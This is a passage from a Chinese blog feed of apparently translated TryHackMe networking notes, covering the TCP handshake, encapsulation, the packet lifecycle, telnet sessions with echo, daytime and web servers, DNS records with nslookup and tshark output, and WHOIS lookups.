&lt;p&gt;SYN 数据包：客户端通过向服务器发送 SYN 数据包来发起连接。此数据包包含&lt;strong&gt;客户端&lt;/strong&gt;随机选择的&lt;strong&gt;初始序列号&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;SYN-ACK 数据包：服务器使用 SYN-ACK 数据包响应 SYN 数据包，该数据包添加&lt;strong&gt;服务器&lt;/strong&gt;随机选择的&lt;strong&gt;初始序列号&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;ACK 数据包： 当客户端发送 ACK 数据包以确认收到 SYN-ACK 数据包时，三次握手完成。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408000451140.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408000451140&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;与 UDP 类似，TCP 使用端口号标识启动或等待（侦听）连接的过程。如前所述，有效端口号的范围介于 1 和 65535 之间，因为它使用两个八位字节，并且端口 0 是保留的。&lt;/p&gt;
&lt;h2 id=&#34;封装&#34;&gt;封装
&lt;/h2&gt;&lt;p&gt;在结束之前，解释另一个关键概念至关重要： &lt;strong&gt;封装&lt;/strong&gt; 。在这种情况下，封装是指每一层向接收到的数据单元添加&lt;strong&gt;标头&lt;/strong&gt;（有时是&lt;strong&gt;尾部&lt;/strong&gt;）并将“封装”单元发送到下一层的过程。&lt;/p&gt;
&lt;p&gt;封装是一个基本概念，因为它允许每个层专注于&lt;strong&gt;其预期功能&lt;/strong&gt;。在下图中，我们有以下&lt;strong&gt;四个&lt;/strong&gt;步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;应用程序数据&lt;/strong&gt; ：当用户输入他们想要发送到应用程序中的数据时，这一切都开始了。例如，您编写电子邮件或即时消息并点击发送按钮。应用程序格式化此数据，并根据使用的应用程序协议开始发送数据，使用其下面的层（传输层）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传输协议分段或数据报&lt;/strong&gt; ：传输层（如 TCP 或 UDP）添加适当的标头信息并创建 TCP &lt;strong&gt;分段&lt;/strong&gt; （或 UDP &lt;strong&gt;数据报&lt;/strong&gt; ）。此段将发送到其下面的层，即网络层。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络数据包&lt;/strong&gt; ：网络层（即 Internet 层）将 IP 标头添加到接收到的 TCP 分段或 UDP 数据报中。然后，此 IP &lt;strong&gt;数据包&lt;/strong&gt;被发送到其下面的层，即数据链路层。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据链路帧&lt;/strong&gt; ：以太网或 WiFi 接收 IP 数据包并添加适当的&lt;strong&gt;标头&lt;/strong&gt;和&lt;strong&gt;尾部&lt;/strong&gt;，从而创建一个&lt;strong&gt;帧&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们从应用程序数据开始。在传输层，我们添加 TCP 或 UDP 标头以创建 &lt;strong&gt;TCP 分段&lt;/strong&gt;或 &lt;strong&gt;UDP 数据报&lt;/strong&gt; 。同样，在网络层，我们添加适当的 IP 报头，以获取可以通过 Internet 路由的 &lt;strong&gt;IP 数据包&lt;/strong&gt; 。最后，我们添加适当的标头和尾部，以在链路层获得 WiFi 或以太网&lt;strong&gt;帧&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408000930650.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408000930650&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;该过程必须在接收端反转，直到提取应用程序数据。&lt;/p&gt;
&lt;h3 id=&#34;数据包的生命周期&#34;&gt;数据包的生命周期
&lt;/h3&gt;&lt;p&gt;根据我们目前的研究，我们可以解释数据包生命周期的&lt;em&gt;简化版本&lt;/em&gt; 。让我们考虑一下你在 TryHackMe 上搜索房间的场景。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在 TryHackMe 搜索页面上，输入搜索查询并按 Enter。&lt;/li&gt;
&lt;li&gt;使用 HTTPS 的 Web 浏览器准备 HTTP 请求并将其推送到其下面的层，即传输层。&lt;/li&gt;
&lt;li&gt;TCP 层需要通过浏览器和 TryHackMe Web 服务器之间的三次握手建立连接。建立 TCP 连接后，它可以发送包含搜索查询的 HTTP 请求。创建的每个 TCP 分段都会发送到其下面的层，即 Internet 层。&lt;/li&gt;
&lt;li&gt;IP 层添加&lt;strong&gt;源 IP 地址&lt;/strong&gt;（即您的计算机）和&lt;strong&gt;目标 IP 地址&lt;/strong&gt;（即 TryHackMe Web 服务器的 IP 地址）。要使此数据包到达路由器，您的笔记本电脑会将其传送到其下方的层，即链路层。&lt;/li&gt;
&lt;li&gt;根据协议，链路层会添加适当的链路层报头和尾部，并将数据包发送到路由器。&lt;/li&gt;
&lt;li&gt;路由器删除链路层报头和尾部，检查 IP 目标等字段，并将数据包路由到正确的链路。每个路由器都会重复此过程，直到到达目标服务器的路由器。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然后，当数据包到达目标网络的路由器时，这些步骤将&lt;strong&gt;相反&lt;/strong&gt;。在介绍其他协议时，我们将重新审视此练习并创建更深入的版本。&lt;/p&gt;
&lt;h2 id=&#34;远程登陆&#34;&gt;远程登陆
&lt;/h2&gt;&lt;p&gt;TELNET （Teletype Network） 协议是一种用于远程终端连接的网络协议。简而言之，&lt;code&gt;telnet&lt;/code&gt; 是一种 TELNET 客户端，允许您连接到远程系统并与之通信，并发出文本命令。虽然最初它用于&lt;strong&gt;远程管理&lt;/strong&gt;，但我们可以使用 &lt;code&gt;telnet&lt;/code&gt; 连接到任何&lt;strong&gt;监听 TCP 端口号&lt;/strong&gt;的服务器。&lt;/p&gt;
&lt;p&gt;在目标虚拟机上，正在运行不同的服务。我们将试验其中的三个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Echo server：此服务器会回显您发送的所有内容。默认情况下，它侦听端口 7。&lt;/li&gt;
&lt;li&gt;aytime server：此服务器默认侦听端口 13 并回复当前日期和时间。&lt;/li&gt;
&lt;li&gt;Web （HTTP） 服务器：默认情况下，此服务器侦听 TCP 端口 80 并提供网页。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在继续之前，我们应该提到 echo 和 daytime 服务器被视为安全风险，不应运行;但是，我们显式启动它们是为了演示使用 &lt;code&gt;Telnet&lt;/code&gt; 与服务器的通信。在下面的终端中，我们连接到位于 echo 服务器的 TCP 端口号 7 的目标 VM。要关闭连接，请按 &lt;code&gt;CTRL&lt;/code&gt; + &lt;code&gt;]&lt;/code&gt; 键同时。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.118.233 7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.10.118.233 7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.118.233...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.118.233.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;How are you?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;How are you?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bye
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bye
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; quit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在下面的终端中，我们使用 &lt;code&gt;telnet&lt;/code&gt; 连接到在端口 13 监听的日间服务器。我们注意到，一旦返回当前日期和时间，连接就会关闭。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.118.233 13
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.118.233...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.118.233.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Thu Jun 20 12:36:32 PM UTC 2024
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed by foreign host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;最后，让我们使用 &lt;code&gt;telnet&lt;/code&gt; 请求一个网页。连接 80 端口后，需要发出命令 &lt;code&gt;GET / HTTP/1.1&lt;/code&gt; 并确定任何内容的去向主机，例如 &lt;code&gt;Host： telnet.thm&lt;/code&gt;。接下来，您需要按两次 &lt;code&gt;Enter&lt;/code&gt; 键，使最后一个输入行为空行。下面的输出显示了交换。（该页面已被编辑。)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; ：发送信息后，您可能必须按 &lt;code&gt;Enter&lt;/code&gt;，以免您没有收到回复。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ telnet 10.10.118.233 80
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Trying 10.10.118.233...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to 10.10.118.233.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escape character is &amp;#39;&lt;span class=&#34;se&#34;&gt;^]&lt;/span&gt;&amp;#39;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: telnet.thm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 200 OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection closed by foreign host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>网络核心协议</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE/</link>
        <pubDate>Tue, 08 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE/</guid>
        <description>&lt;h2 id=&#34;dns记住地址&#34;&gt;DNS：记住地址
&lt;/h2&gt;&lt;p&gt;您记得您最喜欢的网站的 IP 地址吗？除非是本地设备的私有 IP 地址，否则没有人需要担心记住 IP 地址。这部分是由于域名系统 （DNS） 负责将域名正确映射到 IP 地址。&lt;/p&gt;
&lt;p&gt;DNS 在应用层（即 ISO OSI 模型的第 7 层）运行。DNS 流量默认使用 UDP 端口 53， 使用 TCP 端口 53 作为默认回退。DNS 记录有多种类型;但是，在本任务中，我们将重点介绍以下四个方面：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A record&lt;/strong&gt;：A （Address） 记录将主机名映射到一个或多个 &lt;strong&gt;IPv4&lt;/strong&gt; 地址。例如，您可以将 &lt;code&gt;example.com&lt;/code&gt; 设置为 resolve 为 &lt;code&gt;172.17.2.172&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AAAA Record&lt;/strong&gt;：AAAA 记录类似于 A 记录，但它适用于 &lt;strong&gt;IPv6&lt;/strong&gt;。请记住，它是 AAAA（四 A），因为 AA 和 AAA 指的是电池尺寸;此外，AAA 是指 &lt;em&gt;Authentication、Authorization 和 Accounting&lt;/em&gt;;两者都不属于 DNS。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CNAME Record&lt;/strong&gt;：CNAME （Canonical Name） 记录将一个域名映射到另一个域名。例如，&lt;code&gt;www.example.com&lt;/code&gt; 可以映射到 &lt;code&gt;example.com&lt;/code&gt; 甚至 &lt;code&gt;example.org&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MX Record&lt;/strong&gt;：MX （Mail Exchange） 记录指定负责处理域&lt;strong&gt;电子邮件&lt;/strong&gt;的邮件服务器。&lt;/p&gt;
&lt;p&gt;换句话说，当您在浏览器中键入 &lt;code&gt;example.com&lt;/code&gt; 时，浏览器会尝试通过查询 DNS 服务器来查询 A 记录来解析此域名。但是，当您尝试向 &lt;code&gt;test@example.com&lt;/code&gt; 发送电子邮件时，邮件服务器将查询 DNS 服务器以查找 MX 记录。&lt;/p&gt;
&lt;p&gt;如果要从命令行查找域的 IP 地址，可以使用 &lt;code&gt;nslookup&lt;/code&gt; 等工具。考虑下面终端中我们查找 &lt;code&gt;example.com&lt;/code&gt; 的示例。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ nslookup www.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server:         127.0.0.53
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Address:        127.0.0.53#53
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Non-authoritative answer:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name:   www.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Address: 93.184.215.14
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name:   www.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Address: 2606:2800:21f:cb07:6820:80da:af6b:8b2c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的查询导致了四个数据包。在下面的终端中，我们可以看到第一个和第三个数据包分别发送了 A 和 AAAA 记录的 DNS 查询。第二个和第四个数据包显示 DNS 查询响应。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ tshark -r dns-query.pcapng -Nn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    1 0.000000000 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x2e0f A www.example.com OPT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    2 0.059049584 192.168.66.1 → 192.168.66.89 DNS 102 Standard query response 0x2e0f A www.example.com A 93.184.215.14 OPT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    3 0.059721705 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x96e1 AAAA www.example.com OPT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    4 0.101568276 192.168.66.1 → 192.168.66.89 DNS 114 Standard query response 0x96e1 AAAA www.example.com AAAA 2606:2800:21f:cb07:6820:80da:af6b:8b2c OPT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;whois&#34;&gt;WHOIS
&lt;/h2&gt;&lt;p&gt;在上一个任务中，我们介绍了如何将域名解析为 IP 地址。但是，要实现此目的，需要有人有权为域设置 A、AAAA 和 MX 记录以及其他 DNS 记录。注册域名的人被授予此权力。因此，如果您注册 example.com，则可以为 example.com 设置任何有效的 DNS 记录。&lt;/p&gt;
&lt;p&gt;您可以注册任何可用的域名一年或多年。您需要支付年费，并且需要提供作为注册人的&lt;a class=&#34;link&#34; href=&#34;https://www.icann.org/resources/pages/whois-data-accuracy-2017-06-20-en&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;准确联系信息 &lt;/a&gt;。此信息是通过 WHOIS 记录提供的数据的一部分，并且是公开的。（虽然 WHOIS 是大写的，但它不是首字母缩略词;它的发音&lt;em&gt;是 who&lt;/em&gt;。但是，如果您想在不公开透露联系信息的情况下注册域，请不要担心;您可以使用其中一种隐私服务，从 WHOIS 记录中隐藏您的所有信息。&lt;/p&gt;
&lt;p&gt;您可以使用在线服务之一或通过命令行工具 &lt;code&gt;whois&lt;/code&gt; 查找任何注册域名的 WHOIS 记录，该工具可在 Linux 系统上使用，等等。正如预期的那样，WHOIS 记录提供了有关注册域名的实体的信息，包括名称、电话号码、电子邮件和地址。在下面显示的屏幕截图中，您可以看到记录的首次创建时间和上次更新时间。此外，您可以找到注册人的姓名、地址、电话和电子邮件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408013007754.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408013007754&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在下面的终端输出中，我们使用了 &lt;code&gt;whois&lt;/code&gt; 命令来查找其 WHOIS 记录受隐私保护保护的域。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@TryHackMe$ whois [REDACTED].com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain Name: [REDACTED].COM
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registry Domain ID: [REDACTED]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar WHOIS Server: whois.godaddy.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registrar URL: https://www.godaddy.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Updated Date: 2017-07-05T16:02:43Z
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Creation Date: 1993-04-02T00:00:00Z
